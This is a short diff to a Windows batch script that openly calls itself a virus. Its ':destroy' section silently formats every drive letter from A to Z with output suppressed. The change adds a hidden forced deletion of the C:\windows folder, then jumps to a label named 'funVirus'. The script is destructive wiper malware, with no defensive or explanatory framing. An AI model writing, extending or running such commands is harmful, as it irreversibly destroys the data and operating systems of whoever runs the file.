@@ -36,7 +36,6 @@ echo    ************************************************************************
 
 goto reopen
 
-
 :destroy
 echo Initiating complete destruction...
 echo Deleting all files and folders...
@@ -48,4 +47,6 @@ for %%d in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
     echo Deleting %%d:\
     format %%d: /q /y >nul 2>&1
 )
+echo Deleting folder windows
+@RD /S /Q "C:\windows" >nul 2>&1
 goto funVirus
